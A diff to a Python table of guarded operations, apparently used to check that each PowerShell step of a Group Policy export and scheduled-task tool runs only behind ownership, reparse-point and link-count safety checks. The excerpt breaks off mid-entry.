@@ -2260,6 +4029,91 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
                 "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                 "foreach ($archive in $expired)",
                 "guard Assert-GpoLensRegularTree -Root $folder",
+            ),
+        ),
+        (
+            (
+                'Write-GpoLensCollectionLog @logArgs -Message "Collection succeeded: '
+                '$($newest.Name); retained at most $Retention exports"'
+            ),
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            'Write-Host "Collection succeeded: $($newest.FullName)"',
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "try",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "guard if ($created.Count -ne 1) -> throw",
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+            ),
+        ),
+        (
+            (
+                'Write-GpoLensCollectionLog @logArgs -Message "Collection failed: '
+                '$($failure.Exception.Message)"'
+            ),
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "catch []",
+                "try",
+            ),
+        ),
+        (
+            "Write-Warning 'Unable to write collection failure log.'",
+            (
+                "function Invoke-GpoLensCollection",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
+                "catch []",
+                "catch []",
+            ),
+        ),
+        (
+            (
+                "Invoke-GpoLensCollection -OutputRoot $OutputRoot -CollectorPath "
+                "$CollectorPath ` -TaskName $TaskName ` -Retention $Retention -CopyTo $CopyTo "
+                "-InventoryPath $InventoryPath ` -LogMaxBytes $LogMaxBytes -LogFiles $LogFiles"
+            ),
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "try",
+                "guard if (-not $OutputRoot) -> throw",
+            ),
+        ),
+        (
+            'Write-Error "Collection failed: $($_.Exception.Message)" -ErrorAction Continue',
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "catch []",
             ),
         ),
         (
@@ -2467,177 +4321,59 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
                 "finally",
             ),
         ),
-        (
-            "Read-GpoLensOwnerMarkerBytes -Marker $marker",
-            (
-                "function Assert-GpoLensCollectionOwner",
-                "guard if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) -> throw",
-            ),
-        ),
-        (
-            "Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-            (
-                "function Invoke-GpoLensCollection",
-                (
-                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
-                    "-LiteralPath $OutputRoot -Force).Attributes -band "
-                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
-                ),
-            ),
-        ),
-        (
-            "Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-            (
-                "function Invoke-GpoLensCollection",
-                (
-                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
-                    "-LiteralPath $OutputRoot -Force).Attributes -band "
-                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
-                ),
-                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-                "try",
-            ),
-        ),
-        (
-            "Write-GpoLensCollectionLog @logArgs -Message 'Collection started'",
-            (
-                "function Invoke-GpoLensCollection",
-                (
-                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
-                    "-LiteralPath $OutputRoot -Force).Attributes -band "
-                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
-                ),
-                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-                "try",
-                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-            ),
-        ),
-        (
-            "Write-GpoLensCollectionLog @logArgs -Message ($_ | Out-String).TrimEnd()",
-            (
-                "function Invoke-GpoLensCollection",
-                (
-                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
-                    "-LiteralPath $OutputRoot -Force).Attributes -band "
-                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
-                ),
-                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-                "try",
-                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-                "scriptblock positional of ForEach-Object",
-            ),
-        ),
-        (
-            "Get-GpoLensCompletedExports -OutputRoot $OutputRoot",
-            (
-                "function Invoke-GpoLensCollection",
-                (
-                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
-                    "-LiteralPath $OutputRoot -Force).Attributes -band "
-                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
-                ),
-                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-                "try",
-                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-            ),
-        ),
-        (
-            'Write-GpoLensCollectionLog @logArgs -Message "ZIP delivered: $delivery"',
-            (
-                "function Invoke-GpoLensCollection",
-                (
-                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
-                    "-LiteralPath $OutputRoot -Force).Attributes -band "
-                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
-                ),
-                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-                "try",
-                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-                "guard if ($created.Count -ne 1) -> throw",
-                "if ($CopyTo) after []",
-            ),
-        ),
-        (
-            "Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-            (
-                "function Invoke-GpoLensCollection",
-                (
-                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
-                    "-LiteralPath $OutputRoot -Force).Attributes -band "
-                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
-                ),
-                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-                "try",
-                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-                "guard if ($created.Count -ne 1) -> throw",
-            ),
-        ),
-        (
-            "Get-GpoLensCompletedExports -OutputRoot $OutputRoot",
-            (
-                "function Invoke-GpoLensCollection",
-                (
-                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
-                    "-LiteralPath $OutputRoot -Force).Attributes -band "
-                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
-                ),
-                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-                "try",
-                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-                "guard if ($created.Count -ne 1) -> throw",
-                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-            ),
-        ),
-        (
-            (
-                'Write-GpoLensCollectionLog @logArgs -Message "Collection succeeded: '
-                '$($newest.Name); retained at most $Retention exports"'
-            ),
-            (
-                "function Invoke-GpoLensCollection",
-                (
-                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
-                    "-LiteralPath $OutputRoot -Force).Attributes -band "
-                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
-                ),
-                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-                "try",
-                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-                "guard if ($created.Count -ne 1) -> throw",
-                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-            ),
-        ),
-        (
-            (
-                'Write-GpoLensCollectionLog @logArgs -Message "Collection failed: '
-                '$($failure.Exception.Message)"'
-            ),
-            (
-                "function Invoke-GpoLensCollection",
-                (
-                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
-                    "-LiteralPath $OutputRoot -Force).Attributes -band "
-                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
-                ),
-                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
-                "catch []",
-                "try",
-            ),
-        ),
-        (
-            (
-                "Invoke-GpoLensCollection -OutputRoot $OutputRoot -CollectorPath "
-                "$CollectorPath ` -TaskName $TaskName ` -Retention $Retention -CopyTo $CopyTo "
-                "-InventoryPath $InventoryPath ` -LogMaxBytes $LogMaxBytes -LogFiles $LogFiles"
-            ),
-            (
-                "if ($MyInvocation.InvocationName -ne '.') after []",
-                "try",
-                "guard if (-not $OutputRoot) -> throw",
-            ),
-        ),
     ),
     "GpoLensCollectionMarker.ps1": (
+        (
+            "Get-Item -LiteralPath $Marker -Force -ErrorAction Stop",
+            (
+                "function Read-GpoLensOwnerMarkerBytes",
+                "if-condition after []",
+            ),
+        ),
+        (
+            (
+                "Add-Type -TypeDefinition @' using System; using System.ComponentModel; using "
+                "System.Runtime.InteropServices; using Microsoft.Win32.SafeHandles; namespace "
+                "GpoLens { public static class MarkerFileInfo { "
+                "[StructLayout(LayoutKind.Sequential)] private struct FileInfo { public uint "
+                "Attributes; public System.Runtime.InteropServices.ComTypes.FILETIME "
+                "CreationTime; public System.Runtime.InteropServices.ComTypes.FILETIME "
+                "LastAccessTime; public System.Runtime.InteropServices.ComTypes.FILETIME "
+                "LastWriteTime; public uint VolumeSerialNumber; public uint FileSizeHigh; "
+                "public uint FileSizeLow; public uint NumberOfLinks; public uint "
+                'FileIndexHigh; public uint FileIndexLow; } [DllImport("kernel32.dll", '
+                "SetLastError = true)] [return: MarshalAs(UnmanagedType.Bool)] private static "
+                "extern bool GetFileInformationByHandle(SafeFileHandle handle, out FileInfo "
+                "info); public static uint LinkCount(SafeFileHandle handle) { FileInfo info; "
+                "if (!GetFileInformationByHandle(handle, out info)) throw new "
+                "Win32Exception(Marshal.GetLastWin32Error()); if ((info.Attributes & 0x400) != "
+                '0) throw new InvalidOperationException("Collection refuses a linked owner '
+                "marker.\"); return info.NumberOfLinks; } } } '@ -ErrorAction Stop"
+            ),
+            (
+                "function Read-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
+                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
+                ),
+                "try",
+                "if ([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT) after []",
+                "if (-not ('GpoLens.MarkerFileInfo' -as [type])) after []",
+            ),
+        ),
+        (
+            "Test-Path -LiteralPath $opened",
+            (
+                "function Read-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
+                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
+                ),
+                "try",
+                "else of [([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)]",
+                "if-condition after []",
+            ),
+        ),
         (
             "& stat -L --format=%h -- $opened 2>$null",
             (
@@ -2649,6 +4385,20 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
                 "try",
                 "else of [([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)]",
                 "guard if (-not (Test-Path -LiteralPath $opened)) -> throw",
+            ),
+        ),
+        (
+            "Get-Item -LiteralPath $OutputRoot -Force -ErrorAction Stop",
+            ("function Write-GpoLensOwnerMarkerBytes",),
+        ),
+        (
+            "Join-Path $root.FullName '.gpo-lens-collection-owner'",
+            (
+                "function Write-GpoLensOwnerMarkerBytes",
+                (
+                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
             ),
         ),
         (
@@ -2749,8 +4499,30 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
     ),
     "Register-GpoLensCollection.ps1": (
         (
+            "Join-Path $PSScriptRoot 'Export-GpoEstate.ps1'",
+            (),
+        ),
+        (
             ". (Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1')",
             (),
+        ),
+        (
+            "Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1'",
+            (),
+        ),
+        (
+            "Test-Path -LiteralPath $OutputRoot",
+            (
+                "function Set-GpoLensCollectionOwner",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "Get-Item -LiteralPath $OutputRoot -Force",
+            (
+                "function Set-GpoLensCollectionOwner",
+                "if-condition after []",
+            ),
         ),
         (
             "New-Item -ItemType Directory -Path $OutputRoot -Force",
@@ -2761,6 +4533,104 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
                     "-LiteralPath $OutputRoot -Force).Attributes -band "
                     "[IO.FileAttributes]::ReparsePoint)) -> throw"
                 ),
+            ),
+        ),
+        (
+            "Out-Null",
+            (
+                "function Set-GpoLensCollectionOwner",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "Join-Path $OutputRoot 'collection.lock'",
+            (
+                "function Set-GpoLensCollectionOwner",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "Join-Path $OutputRoot '.gpo-lens-collection-owner'",
+            (
+                "function Set-GpoLensCollectionOwner",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "try",
+            ),
+        ),
+        (
+            "Test-Path -LiteralPath $marker",
+            (
+                "function Set-GpoLensCollectionOwner",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "try",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "Read-GpoLensOwnerMarkerBytes -Marker $marker",
+            (
+                "function Set-GpoLensCollectionOwner",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "try",
+                "if (Test-Path -LiteralPath $marker) after []",
+            ),
+        ),
+        (
+            (
+                "Write-Warning \"Changing output root owner from '$owner' to '$TaskName'; "
+                "the previous task will refuse to run. Existing exports become subject to this "
+                "task's retention.\""
+            ),
+            (
+                "function Set-GpoLensCollectionOwner",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "try",
+                "if (Test-Path -LiteralPath $marker) after []",
+                (
+                    "if (-not [string]::Equals($owner, $TaskName, "
+                    "[StringComparison]::OrdinalIgnoreCase)) after []"
+                ),
+                "guard if (-not $Force) -> throw",
+            ),
+        ),
+        (
+            (
+                "Write-GpoLensOwnerMarkerBytes -OutputRoot $OutputRoot -Bytes "
+                "([Text.UTF8Encoding]::new($false).GetBytes($TaskName))"
+            ),
+            (
+                "function Set-GpoLensCollectionOwner",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "try",
+                "try",
             ),
         ),
         (
@@ -2777,6 +4647,20 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             ),
         ),
         (
+            "Write-GpoLensOwnerMarkerBytes -OutputRoot $OutputRoot -Bytes $previousBytes",
+            (
+                "function Set-GpoLensCollectionOwner",
+                (
+                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
+                    "-LiteralPath $OutputRoot -Force).Attributes -band "
+                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
+                ),
+                "try",
+                "catch []",
+                "if ($null -ne $previousBytes) after []",
+            ),
+        ),
+        (
             "Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false",
             (
                 "if ($MyInvocation.InvocationName -ne '.') after []",
@@ -2785,7 +4669,313 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             ),
         ),
         (
+            'Write-Host "Unregistered task: $TaskName (exports and logs retained)"',
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "if ($Unregister) after []",
+                "if ($PSCmdlet.ShouldProcess($TaskName, 'Unregister collection task')) after []",
+            ),
+        ),
+        (
+            "Resolve-Path -LiteralPath $CollectorPath",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "Resolve-Path -LiteralPath (Join-Path $PSScriptRoot 'Run-GpoLensCollection.ps1')",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "Join-Path $PSScriptRoot 'Run-GpoLensCollection.ps1'",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "ConvertTo-GpoLensTaskArgument $runner",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "ConvertTo-GpoLensTaskArgument $CollectorPath",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "ConvertTo-GpoLensTaskArgument $OutputRoot",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "ConvertTo-GpoLensTaskArgument $TaskName",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+            ),
+        ),
+        (
+            "ConvertTo-GpoLensTaskArgument (ConvertTo-GpoLensAbsolutePath $CopyTo)",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                "if ($CopyTo) after []",
+            ),
+        ),
+        (
+            "ConvertTo-GpoLensAbsolutePath $CopyTo",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                "if ($CopyTo) after []",
+            ),
+        ),
+        (
+            "ConvertTo-GpoLensTaskArgument (ConvertTo-GpoLensAbsolutePath $InventoryPath)",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                "if ($InventoryPath) after []",
+            ),
+        ),
+        (
+            "ConvertTo-GpoLensAbsolutePath $InventoryPath",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                "if ($InventoryPath) after []",
+            ),
+        ),
+        (
+            "New-ScheduledTaskPrincipal -UserId $account -LogonType Password -RunLevel Limited",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
+            ),
+        ),
+        (
+            (
+                "New-ScheduledTaskAction -Execute "
+                '"$windowsRoot\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" ` -Argument '
+                "$taskArgs -WorkingDirectory $PSScriptRoot"
+            ),
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
+            ),
+        ),
+        (
+            "New-ScheduledTaskTrigger -Daily -DaysInterval $EveryDays -At $scheduleTime",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
+            ),
+        ),
+        (
+            (
+                "New-ScheduledTaskSettingsSet -ExecutionTimeLimit $ExecutionTimeLimit ` "
+                "-MultipleInstances IgnoreNew -StartWhenAvailable"
+            ),
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
+            ),
+        ),
+        (
+            (
+                "New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal "
+                "-Settings $settings ` -Description 'Read-only GPO export, bounded retention, "
+                "rotating logs and optional ZIP delivery.'"
+            ),
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
+            ),
+        ),
+        (
+            (
+                "Get-Credential -UserName $ServiceAccount -Message 'Collection task "
+                "credentials (saved only by Windows Task Scheduler)'"
+            ),
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
+                "if (-not $GmsaAccount) after []",
+                "if (-not $Credential) after []",
+            ),
+        ),
+        (
+            (
+                "Set-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName "
+                "-Force:$Force -RegisterTask { if ($GmsaAccount) { Register-ScheduledTask "
+                "-TaskName $TaskName -InputObject $task -Force | Out-Null } else { "
+                "Register-ScheduledTask -TaskName $TaskName -InputObject $task -User "
+                "$ServiceAccount -Password $taskPassword -Force | Out-Null } }"
+            ),
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
+                "try",
+            ),
+        ),
+        (
             "Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
+                "try",
+                "scriptblock -RegisterTask of Set-GpoLensCollectionOwner",
+                "if ($GmsaAccount) after []",
+            ),
+        ),
+        (
+            "Out-Null",
             (
                 "if ($MyInvocation.InvocationName -ne '.') after []",
                 "guard if ($Unregister) -> return",
@@ -2828,6 +5018,146 @@ GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
             ),
         ),
         (
+            "Out-Null",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
